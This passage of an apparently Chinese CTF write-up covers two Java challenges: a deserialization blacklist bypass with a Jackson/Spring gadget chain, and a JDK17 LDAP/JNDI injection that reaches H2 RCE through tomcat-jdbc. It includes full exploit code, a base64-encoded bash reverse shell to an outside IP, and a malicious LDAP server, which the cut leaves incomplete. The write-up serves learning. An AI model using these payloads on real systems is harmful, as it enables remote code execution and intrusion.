<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 弱黑名单 通过bytes比较</span><br><span class="line">java.util.HashMap</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">com.alibaba.fastjson.JSONArrayLlist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">javax.management.BadAttributeValueExpException</span><br><span class="line">com.sun.syndication.feed.impl.ToStringBean</span><br><span class="line">java.security.SignedObject</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure>
<p>弱黑名单可以用utf-8-overlong直接绕过，墙黑名单ban了和没ban一样的，没啥区别，直接打jackson的pojonode就行了。exp如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.pocs.jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.javasec.utils.SerializeUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XstringTemplateChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        SerializeUtils.OverideJackson();</span><br><span class="line"><span class="comment">//        Templates templates = SerializeUtils.getTemplateByclass(&quot;/Applications/CTFLearning/JavaSec/target/production/JavaSec/com/javasec/memshell/HW/IndexController.class&quot;);</span></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> SerializeUtils.getTemplate(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4yNC4xODgvNzc3OCA8JjEi&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templates);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line"><span class="comment">//        JSONObject jsonObject = new JSONObject();</span></span><br><span class="line"><span class="comment">//        jsonObject.put(&quot;poc&quot;,templates);</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;123&quot;</span>));</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jsonNodes);</span><br><span class="line">        <span class="comment">// 执行序列化与反序列化，并且返回序列化数据</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = SerializeUtils.makeMap(h1, h2);</span><br><span class="line">        System.out.println(base64serial(map));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">CustomObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734445120-aa4f213c-1fc7-46d8-b148-d90d36cc0f59.png#averageHue=%23a8a8a8&clientId=u3af23d66-84b5-4&from=paste&id=u0cd271f9&originHeight=1980&originWidth=3148&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ud4974ecc-be22-4cea-9dcf-9ac71b9085d&title="><br>直接sudo读flag就行了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734445205-c5f73037-ff69-4366-a9d1-df2fca4c74b6.png#averageHue=%232c2e3a&clientId=u3af23d66-84b5-4&from=paste&id=HWgpJ&originHeight=1672&originWidth=2632&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uf7d38fd8-1545-4526-a349-7e07aaa4a30&title="></p>
<h2 id="ezldap"><a href="#ezldap" class="headerlink" title="ezldap"></a>ezldap</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716734494240-710b60a5-9216-496b-9755-1e9a4d36d84b.jpeg#averageHue=%23f6f6f6&clientId=u3af23d66-84b5-4&from=paste&id=u3eff792f&originHeight=388&originWidth=1083&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ub6107ecf-e7f2-43e8-a549-b6159addbeb&title="><br>actuator 接口泄露</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;_links&quot;: &#123;</span><br><span class="line">    &quot;self&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;beans&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/beans&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;caches&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/caches&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;caches-cache&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/caches/&#123;cache&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;health-path&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/health/&#123;*path&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;health&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/health&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;info&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/info&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;conditions&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/conditions&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;configprops&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/configprops&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;configprops-prefix&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/configprops/&#123;prefix&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;env-toMatch&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/env/&#123;toMatch&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;env&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/env&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;loggers-name&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/loggers/&#123;name&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;loggers&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/loggers&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;heapdump&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/heapdump&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;threaddump&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/threaddump&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;metrics&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/metrics&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;metrics-requiredMetricName&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/metrics/&#123;requiredMetricName&#125;&quot;,</span><br><span class="line">      &quot;templated&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;scheduledtasks&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/scheduledtasks&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;mappings&quot;: &#123;</span><br><span class="line">      &quot;href&quot;: &quot;http://10.233.71.102:8080/actuator/mappings&quot;,</span><br><span class="line">      &quot;templated&quot;: false</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看 mappings 发现 source 端点<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494180-65e029cd-6203-4ff9-a58e-0f2ee3616e12.png#averageHue=%23dbdbdb&clientId=u3af23d66-84b5-4&from=paste&id=u74ecfa69&originHeight=870&originWidth=1824&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u0569bb11-ecd8-4a50-b54f-95e6ece3db7&title="><br>源码泄露路由</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/lookup&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(String path)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://&quot;</span> + path;</span><br><span class="line">    <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    initialContext.lookup(url);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span> (NamingException e)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;failed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并且题目的环境是jdk17，这里就涉及到一个JDK17环境下的Ldap打法，我们先尽可能的搜集信息。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494270-9a7fa3be-5e8f-471a-8c87-5ad9aec3e0ee.png#averageHue=%231a1a1a&clientId=u3af23d66-84b5-4&from=paste&id=u9332ec2c&originHeight=442&originWidth=1386&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u1b0938d8-5480-45ed-bf71-2d2ada584c6&title="><br>configprops根据hint去搜索pool，就只能看到Tomcat Connection，这里fuzz了一波发现是tomcat-jdbc依赖。我们可以配合h2去打一个rce就好。但是我们还需要注意一个东西<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494156-213f47c3-807b-4af3-a80d-7386f6dae7a9.png#averageHue=%23121212&clientId=u3af23d66-84b5-4&from=paste&id=u0e0a4c25&originHeight=312&originWidth=1504&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u85049624-015a-468d-aa97-4e606a0655f&title="><br>trustSerialData为false<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494193-fa5e3a5c-24aa-45d3-bf7f-75dc953b7efd.png#averageHue=%23212225&clientId=u3af23d66-84b5-4&from=paste&id=ud71eb862&originHeight=1378&originWidth=2124&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u7ea18a26-87c3-41ad-b7f9-f564c2e6602&title="><br>那么就说明我们无法走ldap的deserialization路线，只能选择走下面的decodeRefence去配合ObjectFacotry打一个组合拳。而我们想走decodeRefence就需要设置javaNamingRefence<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494687-238b8da9-46f9-4d12-ad24-5ce65e0b4dcc.png#averageHue=%235c9165&clientId=u3af23d66-84b5-4&from=paste&id=uf7fb2f44&originHeight=152&originWidth=1582&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uaa51c452-08b7-4cfa-9d7a-3da66ae7be2&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494799-a2abf384-03bc-4b9f-be06-5289113d9964.png#averageHue=%23272a2f&clientId=u3af23d66-84b5-4&from=paste&id=u6680a1dc&originHeight=1386&originWidth=2776&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u81e54ec6-f1dd-40f8-95d0-1b647d4639a&title="><br>我们成功的进入了decodeReference，在这里我们会对我们传入的attrs做一个处理，去new一个Reference对象<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494861-1cd2c301-fccf-45ca-96e9-c6beb1cbd6a2.png#averageHue=%23282b2f&clientId=u3af23d66-84b5-4&from=paste&id=ue7ef52c8&originHeight=1338&originWidth=3166&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ufbd6c9fe-3839-4b03-80de-7467cd49aff&title="><br>我们选择我们的组合拳套餐。我们配合tomcat-jdbc去打h2，但这里还有个问题就是指定h2的jdbcUrl，这里我们需要利用到另一个变量<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494947-03fc907f-b608-4453-b54f-e739a161e605.png#averageHue=%2324272d&clientId=u3af23d66-84b5-4&from=paste&id=uba74b391&originHeight=1332&originWidth=2710&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uceadbb65-bc2a-4db6-bb94-a8dcaa01206&title="><br>javaReferenceAddr，我们会取ldapserver给的这个值，然后对他做一个分隔处理。可以看到上图中用@隔开了变量名和值，传入了url为恶意的jdbc字符串。随之我们就会进入DatasourceFactory#getObjectInstance<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734494891-2e1f5228-91f1-4e2c-a315-b446442b3207.png#averageHue=%2327292e&clientId=u3af23d66-84b5-4&from=paste&id=u388de097&originHeight=1458&originWidth=2904&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u0a8485d7-86b9-4c08-8b62-3fe707b5e68&title="><br>最终发起H2连接RCE。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716734495204-015ec5d0-1923-4630-8a11-0ec8d4fb4a43.png#averageHue=%232c2e39&clientId=u3af23d66-84b5-4&from=paste&id=u9853abf5&originHeight=1672&originWidth=2632&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u402c7d1b-b58a-4615-8d74-116c566b23e&title="><br>恶意LdapServer如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HackerLDAPRefServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">lanuchLDAPServer</span><span class="params">(Integer ldap_port, String http_server, Integer http_port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    ldap_port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://&quot;</span>+http_server+<span class="string">&quot;:&quot;</span>+http_port+<span class="string">&quot;/#org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;</span>)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + ldap_port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( 